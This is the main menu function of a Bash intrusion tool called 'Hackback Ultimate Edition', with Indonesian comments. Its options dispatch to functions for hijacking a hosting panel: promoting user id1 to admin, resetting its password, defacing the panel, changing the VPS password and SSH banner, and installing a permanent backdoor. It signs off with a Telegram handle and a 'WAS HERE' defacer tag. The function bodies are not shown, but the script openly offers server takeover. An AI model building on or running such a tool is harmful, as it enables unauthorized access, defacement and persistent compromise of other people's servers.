# ==============================================
# MAIN FUNCTION
# ==============================================
main() {
    show_header
    
    # Auto get info panel saat startup
    get_panel_info
    
    # Menu loop
    while true; do
        show_menu
        read choice
        
        case $choice in
            1) get_panel_info ;;
            2) get_user_manual ;;
            3) get_server_info ;;
            4) get_database_info ;;
            5) save_info_file ;;
            6) make_id1_admin ;;
            7) reset_password_id1 ;;
            8) auto_get_and_reset ;;
            9) deface_panel ;;  # NEW: Deface Panel dengan pilihan lengkap
            10) change_vps_password ;;  # Ganti Password VPS
            11) scan_vulnerability ;;  # Scan Vulnerability
            12) change_ssh_banner ;;  # Ubah SSH Banner
            13) install_backdoor ;;  # Install Backdoor Permanen
            14) backup_database ;;  # Backup Database
            15) restore_database ;;  # Restore Database
            0)
                echo -e "\n${GREEN}Thanks for using Hackback Ultimate Edition!${NC}"
                echo -e "${CYAN}Telegram: @lynnn046${NC}"
                echo -e "${RED}R3NNDZZ WAS HERE!${NC}\n"
                exit 0
                ;;
            *)
                echo -e "${RED}Pilihan tidak valid!${NC}"
                ;;
        esac
        
        echo ""
        echo -ne "${CYAN}Tekan Enter untuk melanjutkan...${NC}"
        read
        clear
        show_header
        get_panel_info > /dev/null 2>&1
    done
}

# Run main
main
